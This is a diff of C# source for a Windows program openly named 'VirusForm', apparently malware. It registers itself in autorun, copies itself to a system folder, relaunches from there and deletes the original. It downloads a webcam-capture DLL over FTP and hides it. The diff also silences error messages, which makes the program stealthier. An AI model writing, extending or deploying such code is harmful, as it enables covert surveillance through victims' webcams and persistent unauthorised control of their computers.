@@ -27,46 +27,34 @@ namespace VirusForm
         {
             if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista")
             {
-                Autorun.SetAutorunValue(true, needPatch + "VirusForm.exe"); // добавить в автозагрузку
-                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
+                Autorun.SetAutorunValue(true, needPatch + "VirusForm.exe");
+
             }
             else
                 if (OSVersionInfo.Name == "Windows XP")
                 {
                     needPatch = "C:\\Documents and Settings\\All Users\\";
-                    Autorun.SetAutorunValue(true, needPatch + "VirusForm.exe"); // добавить в автозагрузку
-                    //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
+                    Autorun.SetAutorunValue(true, needPatch + "VirusForm.exe");
                 }
 
-           
+
 
             if (Application.ExecutablePath != needPatch + "VirusForm.exe")
-                {
-                    
-                    CopyVirusFile();
-                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
-                    proc.StartInfo.FileName = needPatch + "VirusForm.exe";
-                    proc.Start();
-                   
-                    SelfDelete();
-                    Process.GetCurrentProcess().Kill();
-                }
-                
+            {
+                CopyVirusFile();
+                System.Diagnostics.Process proc = new System.Diagnostics.Process();
+                proc.StartInfo.FileName = needPatch + "VirusForm.exe";
+                proc.Start();
+                SelfDelete();
+                Process.GetCurrentProcess().Kill();
+            }
 
-         
-
-         
             InitializeComponent();
-
-
-
         }
         private void VirusFormActivation()
         {
             vsf = new VirusShowForm();
             vsf.ShowDialog();
-            
-            
         }
 
         private void WebCamActivationAndSaveImage()
@@ -119,7 +107,10 @@ namespace VirusForm
                  Network.DownloadFileFTP(needPatch, "WebCam_Capture.dll");
                  File.SetAttributes(needPatch + "WebCam_Capture.dll", FileAttributes.Hidden);
                 }
-                  catch (Exception ex) { MessageBox.Show(ex.Message); }
+                  catch (Exception ex)
+                  {
+                      //MessageBox.Show(ex.Message); 
+                  }
              
              }
 
